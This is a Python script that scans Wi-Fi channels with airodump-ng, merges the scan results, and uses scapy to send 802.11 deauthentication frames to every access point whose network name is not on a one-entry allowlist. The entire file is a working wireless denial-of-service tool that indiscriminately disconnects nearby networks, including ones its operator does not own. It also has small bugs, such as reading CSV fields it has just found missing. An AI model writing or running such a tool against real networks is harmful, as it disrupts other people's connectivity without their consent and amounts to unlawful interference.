import logging
import csv
import time
import subprocess
import os

from threading import Thread, Lock
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

deauth_counter = 0
csv_lock = Lock()

def deauth(t_mac, bssid, iface, ch, count=1):
    global deauth_counter
    subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)])
    
    frame = RadioTap() / Dot11(addr1=t_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=1)
    
    print(f"\nSending packet to {t_mac} on channel {ch}")

    sendp(frame, iface=iface, count=count, inter=0.1, verbose=True)
    
    deauth_counter += count

def check_csv(csv_path, allowed_APs):
    global deauth_counter

    with csv_lock:
        with open(csv_path, 'r') as csvfile:
            reader = csv.DictReader(csvfile)
            for r in reader:
                keys = ['BSSID', 'ESSID', 'channel']
                
                if not all(key in r for key in keys):
                    print(f"BSSID: {r['BSSID']}, ESSID: {r['ESSID']}, channel: {r['channel']}")

                if all(key in r for key in keys):
                    t_mac = r['BSSID']
                    bssid = r['BSSID']
                    essid = r['ESSID']
       
                    if essid not in allowed_APs:
                      deauth(t_mac=t_mac, bssid=bssid, iface="wlan1", ch=int(r['channel']), count=5)
    return deauth_counter

def run_airodump(t, ch, allowed_APs):
    process = subprocess.Popen(["airodump-ng", "--output-format", "csv", "--write", "output", "--channel", str(ch), "--write-interval", "1", "wlan1"])

    time.sleep(t)

    process.terminate()
    
    merge_csv_files()

    deauth_counter = check_csv(csv_path="merged-scan.csv", allowed_APs=allowed_APs)
    

def merge_csv_files():
    files = [f for f in os.listdir() if f.startswith("output-") and f.endswith(".csv")]
    if files:
        files.sort(key=lambda x: int(x.split('-')[1].split('.')[0]))

        with open("merged-scan.csv", 'w', newline='') as output_csv:
            csv_writer = csv.writer(output_csv)

            with open(files[0], 'r') as first_file:
                csv_reader = csv.reader(first_file)
                header = next(csv_reader)
                csv_writer.writerow(header)

            for file in files:
                with open(file, 'r') as current_file:
                    csv_reader = csv.reader(current_file)
                    next(csv_reader)
                    csv_writer.writerows(csv_reader)

       # for file in files:
       #     os.remove(file)
    

def threading_func(ch_list, allowed_APs, t):

    threads = []
    for ch in ch_list:
        thread = Thread(target=run_airodump, args=(t, ch, allowed_APs))
        threads.append(thread)
        thread.start()
    	
    for thread in threads:
    	thread.join()
    	    
    
t = 10
allowed_APs = ["Wapiti2000"] # add Wapiti3004, WapitiWifi, Wapiti77 back
#ch_list = list(range(1,15)) + [36,40,44,48,52,56,60,64,100,104,108,112,116,132,136,140,144,149,153,157,161,165]
ch_list = [1,6,11,36,40,44,48,149,153,157,161]
threading_func(ch_list=ch_list, allowed_APs=allowed_APs, t=t)
